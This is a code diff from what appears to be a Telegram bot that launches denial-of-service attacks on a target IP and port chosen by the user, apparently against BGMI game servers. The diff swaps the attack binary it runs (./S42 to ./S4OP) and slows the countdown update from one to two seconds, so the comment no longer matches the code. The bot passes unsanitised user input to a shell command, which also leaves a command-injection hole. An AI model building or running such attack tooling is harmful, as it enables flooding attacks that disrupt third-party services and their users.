@@ -95,7 +95,7 @@ def handle_bgmi(message):
 
         # Run the attack in a separate thread
         def execute_attack(user_id, target, port, duration):
-            process = subprocess.Popen(f"./S42 {target} {port} {duration} 1000", shell=True)
+            process = subprocess.Popen(f"./S4OP {target} {port} {duration} 1000", shell=True)
             active_attacks[user_id] = process
 
             # Start the attack and update the countdown every second
@@ -111,7 +111,7 @@ def handle_bgmi(message):
                 countdown_button.text = f"⏳ attack end in {remaining_time}"
                 bot.edit_message_reply_markup(chat_id=message.chat.id, message_id=start_message.message_id, reply_markup=markup)
 
-                time.sleep(1)  # Wait for 1 second before updating again
+                time.sleep(2)  # Wait for 1 second before updating again
 
             # Terminate the attack after the duration or if the process finishes
             process.terminate()
